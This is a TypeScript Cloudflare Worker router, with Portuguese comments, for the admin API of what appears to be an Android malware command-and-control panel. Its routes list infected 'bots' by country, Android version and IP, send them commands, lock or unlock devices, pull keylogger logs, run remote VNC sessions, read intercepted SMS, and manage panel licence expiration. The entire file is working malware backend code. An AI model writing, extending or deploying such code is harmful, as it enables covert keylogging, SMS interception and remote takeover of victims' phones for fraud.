// api/src/admin-api/index.ts
// Roteador para rotas /api/admin/* no Cloudflare Worker
// Baseado no admin.class.php, mas retorna apenas JSON (frontend React)

import { SupabaseClient } from '@supabase/supabase-js';
import { createSupabaseClient, Env } from '../shared/supabase-client';
import * as bots from './bots';
import * as smarts from './smarts';
import * as logs from './logs';
import * as stats from './stats';
import * as settings from './settings';
import * as vnc from './vnc';
import * as sms from './sms';

// ----------------------------------------------------------------------
// Resposta JSON helper
// ----------------------------------------------------------------------
function jsonResponse(data: any, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

// ----------------------------------------------------------------------
// Handler principal
// ----------------------------------------------------------------------
export async function handleAdminRequest(
  request: Request,
  env: Env,
  _ctx?: ExecutionContext,
): Promise<Response> {
  // Trata preflight CORS
  if (request.method === 'OPTIONS') {
    return jsonResponse({}, 204);
  }

  const supabase = createSupabaseClient(env);

  const url = new URL(request.url);
  const path = url.pathname;

  if (!path.startsWith('/api/admin/')) {
    return jsonResponse({ error: 'Not found' }, 404);
  }

  const segments = path.slice('/api/admin/'.length).split('/').filter(Boolean);
  if (segments.length === 0) {
    return jsonResponse({ error: 'Missing module' }, 400);
  }

  const module = segments[0];
  const action = segments[1] || 'list';
  const query = url.searchParams;

  try {
    switch (module) {
      case 'bots':
        return await handleBots(request, supabase, action, query);
      case 'smarts':
        return await handleSmarts(request, supabase, action, query);
      case 'logs':
        return await handleLogs(request, supabase, action, query);
      case 'stats':
        return await handleStats(request, supabase, action, query);
      case 'settings':
        return await handleSettings(request, supabase, action, query);
      case 'vnc':
        return await handleVnc(request, supabase, action, query);
      case 'sms':
        return await handleSms(request, supabase, action, query);
      default:
        return jsonResponse({ error: `Unknown module: ${module}` }, 404);
    }
  } catch (err) {
    console.error('[admin]', err);
    const details =
      err instanceof Error ? err.message : JSON.stringify(err, null, 2);
    return new Response(
      JSON.stringify({ error: 'Internal server error', details }),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

// ----------------------------------------------------------------------
// Helper para parsear corpo JSON de forma segura
// ----------------------------------------------------------------------
async function parseJsonBody(request: Request): Promise<any | null> {
  try {
    if (request.method === 'POST' || request.method === 'PUT' || request.method === 'PATCH') {
      return await request.json();
    }
  } catch {
    // corpo vazio ou inválido
  }
  return null;
}

// ----------------------------------------------------------------------
// Handlers por módulo
// ----------------------------------------------------------------------

async function handleBots(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  const method = request.method;

  if (method === 'GET') {
    if (action === 'list') {
      const filters = {
        country: query.get('country') || undefined,
        android: query.get('android') || undefined,
        status: query.get('status') || undefined,
        tag: query.get('tag') || undefined,
        comment: query.get('comment') || undefined,
        ip: query.get('ip') || undefined,
        alive: query.get('alive') === 'true',
        activated: query.get('activated') === 'true',
        page: parseInt(query.get('page') || '0', 10),
        rows: parseInt(query.get('rows') || '40', 10),
        sort_by: query.get('sort_by') || 'last_seen_desc',
      };
      const result = await bots.listBots(supabase, filters);
      return jsonResponse(result);
    }

    if (action === 'detail') {
      const botId = query.get('botId');
      if (!botId) return jsonResponse({ error: 'Missing botId' }, 400);
      const result = await bots.getBotDetail(supabase, botId);
      return jsonResponse(result);
    }
  }

  if (method === 'POST') {
    const body = await parseJsonBody(request);
    if (!body) return jsonResponse({ error: 'Invalid JSON body' }, 400);

    const { botId, command, data } = body;

    if (action === 'command') {
      if (!botId || !command) return jsonResponse({ error: 'Missing botId or command' }, 400);
      const result = await bots.sendCommand(supabase, botId, command, data);
      return jsonResponse(result);
    }

    if (action === 'lock' || action === 'unlock') {
      if (!botId) return jsonResponse({ error: 'Missing botId' }, 400);
      const result = action === 'lock'
        ? await bots.lockBot(supabase, botId)
        : await bots.unlockBot(supabase, botId);
      return jsonResponse(result);
    }
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}

async function handleSmarts(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  const method = request.method;

  if (method === 'GET') {
    if (action === 'list') {
      const result = await smarts.listSmarts(supabase);
      return jsonResponse(result);
    }
    if (action === 'detail') {
      const id = Number(query.get('id'));
      if (!id) return jsonResponse({ error: 'Missing id' }, 400);
      const result = await smarts.getSmartDetail(supabase, id);
      return jsonResponse(result);
    }
  }

  if (method === 'POST') {
    if (action === 'save') {
      const formData = await request.formData();
      const result = await smarts.saveSmart(supabase, formData);
      return jsonResponse(result);
    }
    if (action === 'toggle') {
      const body = await parseJsonBody(request);
      if (!body) return jsonResponse({ error: 'Invalid JSON body' }, 400);
      const { botId, data } = body;
      const active = (data as any)?.active;
      if (botId) {
        return jsonResponse({ error: 'Not supported yet' }, 400);
      }
      const smartId = Number(query.get('id') || (body as any).id);
      if (!smartId || active === undefined) return jsonResponse({ error: 'Missing id or active' }, 400);
      const result = await smarts.toggleSmart(supabase, smartId, Boolean(active));
      return jsonResponse(result);
    }
    if (action === 'toggle_all') {
      const body = await parseJsonBody(request);
      const active = (body as any)?.active;
      if (active === undefined) return jsonResponse({ error: 'Missing active' }, 400);
      const result = await smarts.toggleAll(supabase, Boolean(active));
      return jsonResponse(result);
    }
  }

  if (method === 'DELETE') {
    if (action === 'delete') {
      const id = Number(query.get('id'));
      if (!id) return jsonResponse({ error: 'Missing id' }, 400);
      const result = await smarts.deleteSmart(supabase, id);
      return jsonResponse(result);
    }
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}

// ===================== 🔧 CORREÇÃO AQUI =====================
async function handleLogs(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  const method = request.method;

  if (method === 'GET') {
    // NOVO: listar erros (botId OPCIONAL)
    if (action === 'list' || action === 'default') {
      const botId = query.get('botId') || undefined;
      const text = query.get('text') || undefined;
      const includeKnown = query.get('includeKnown') === 'true';
      const page = Number(query.get('page') || 0);
      const rows = Number(query.get('rows') || 40);
      const result = await logs.listErrors(supabase, { botId, text, includeKnown, page, rows });
      return jsonResponse(result);
    }

    // Endpoint específico para obter o log de keylog de um bot (mantido)
    if (action === 'keylog') {
      const botId = query.get('botId');
      if (!botId) return jsonResponse({ error: 'botId required' }, 400);
      const filter = query.get('filter') || undefined;
      const result = await logs.getBotLog(supabase, botId, filter);
      return jsonResponse(result);
    }

    // Endpoint específico para erros (já existente)
    if (action === 'errors') {
      const botId = query.get('botId') || undefined;
      const text = query.get('text') || undefined;
      const page = Number(query.get('page') || 0);
      const rows = Number(query.get('rows') || 40);
      const result = await logs.listErrors(supabase, { botId, text, page, rows });
      return jsonResponse(result);
    }
  }

  if (method === 'DELETE') {
    if (action === 'delete_error') {
      const id = Number(query.get('id'));
      if (!id) return jsonResponse({ error: 'Missing id' }, 400);
      const result = await logs.deleteError(supabase, id);
      return jsonResponse(result);
    }
    if (action === 'delete_errors_text') {
      const text = query.get('text') || '';
      if (!text) return jsonResponse({ error: 'Missing text' }, 400);
      const result = await logs.deleteErrorsByText(supabase, text);
      return jsonResponse(result);
    }
    if (action === 'delete_all_errors') {
      const result = await logs.deleteAllErrors(supabase);
      return jsonResponse(result);
    }
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}
// ==========================================================

async function handleStats(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  if (request.method !== 'GET') {
    return jsonResponse({ error: 'Method not allowed' }, 405);
  }

  if (action === 'list' || action === 'default' || action === 'all') {
    const result = await stats.getStats(supabase);
    return jsonResponse(result);
  }

  if (action === 'overview') {
    const result = await stats.getOverview(supabase);
    return jsonResponse(result);
  }
  if (action === 'countries') {
    const result = await stats.getCountryStats(supabase);
    return jsonResponse(result);
  }
  if (action === 'tags') {
    const result = await stats.getTagStats(supabase);
    return jsonResponse(result);
  }
  if (action === 'lifetime') {
    const result = await stats.getLifetimeStats(supabase);
    return jsonResponse(result);
  }
  if (action === 'last_week') {
    const result = await stats.getLastWeekStats(supabase);
    return jsonResponse(result);
  }
  if (action === 'android') {
    const result = await stats.getAndroidStats(supabase);
    return jsonResponse(result);
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}

async function handleSettings(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  const method = request.method;

  if (method === 'GET') {
    if (action === 'all' || action === 'list') {
      const result = await settings.getSettings(supabase);
      return jsonResponse(result);
    }
    if (action === 'expiration') {
      const expired = await settings.isPanelExpired(supabase);
      const text = expired ? 'Expired' : await settings.getExpirationText(supabase);
      return jsonResponse({ expired, text });
    }
    if (action === 'view_mode') {
      const mode = await settings.getViewMode(supabase);
      return jsonResponse({ view_mode: mode });
    }
  }

  if (method === 'POST') {
    if (action === 'update') {
      const config = await request.json();
      if (!config || typeof config !== 'object') {
        return jsonResponse({ error: 'Invalid config' }, 400);
      }
      const result = await settings.updateSettings(supabase, config);
      return jsonResponse(result);
    }
    if (action === 'update_expiration') {
      const body = await parseJsonBody(request);
      const timestamp = (body as any)?.timestamp;
      if (!timestamp) return jsonResponse({ error: 'Missing timestamp' }, 400);
      const result = await settings.updateExpiration(supabase, timestamp);
      return jsonResponse(result);
    }
    if (action === 'set_view_mode') {
      const body = await parseJsonBody(request);
      const mode = (body as any)?.mode;
      if (!mode || (mode !== 'day' && mode !== 'night')) return jsonResponse({ error: 'Invalid mode' }, 400);
      const result = await settings.setViewMode(supabase, mode);
      return jsonResponse(result);
    }
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}

// ----------------------------------------------------------------------
// Handler VNC
// ----------------------------------------------------------------------
async function handleVnc(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  if (request.method === 'GET') {
    if (action === 'sessions') {
      const result = await vnc.listVncSessions(supabase);
      return jsonResponse(result);
    }
    if (action === 'layout') {
      const botId = query.get('botId');
      if (!botId) return jsonResponse({ error: 'Missing botId' }, 400);
      const scale = parseFloat(query.get('scale') || '1');
      const offsetX = parseInt(query.get('offsetX') || '0', 10);
      const offsetY = parseInt(query.get('offsetY') || '0', 10);
      const result = await vnc.getVncLayout(supabase, botId, scale, offsetX, offsetY);
      return jsonResponse(result);
    }
  }

  if (request.method === 'POST') {
    const body = await parseJsonBody(request);
    if (!body) return jsonResponse({ error: 'Invalid JSON body' }, 400);
    const { botId, type, data } = body;

    if (action === 'command') {
      if (!botId || !type) return jsonResponse({ error: 'Missing botId or type' }, 400);
      const result = await vnc.sendVncCommand(supabase, botId, type, data);
      return jsonResponse(result);
    }
    if (action === 'stop') {
      if (!botId) return jsonResponse({ error: 'Missing botId' }, 400);
      const result = await vnc.stopVnc(supabase, botId);
      return jsonResponse(result);
    }
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}

// ----------------------------------------------------------------------
// Handler SMS
// ----------------------------------------------------------------------
async function handleSms(
  request: Request,
  supabase: SupabaseClient,
  action: string,
  query: URLSearchParams,
): Promise<Response> {
  if (request.method === 'GET') {
    if (action === 'list' || action === 'default') {
      const filters = {
        botId: query.get('botId') || undefined,
        number: query.get('number') || undefined,
        text: query.get('text') || undefined,
        page: Number(query.get('page') || 0),
        rows: Number(query.get('rows') || 40),
      };
      const result = await sms.listSms(supabase, filters);
      return jsonResponse(result);
    }
    if (action === 'count') {
      const botId = query.get('botId') || undefined;
      const count = await sms.getSmsCount(supabase, botId);
      return jsonResponse({ count });
    }
  }

  if (request.method === 'DELETE') {
    if (action === 'delete') {
      const idsParam = query.get('ids');
      if (!idsParam) return jsonResponse({ error: 'Missing ids' }, 400);
      const ids = idsParam.split(',').map(Number);
      const result = await sms.deleteSms(supabase, ids);
      return jsonResponse(result);
    }
  }

  return jsonResponse({ error: 'Unknown action' }, 404);
}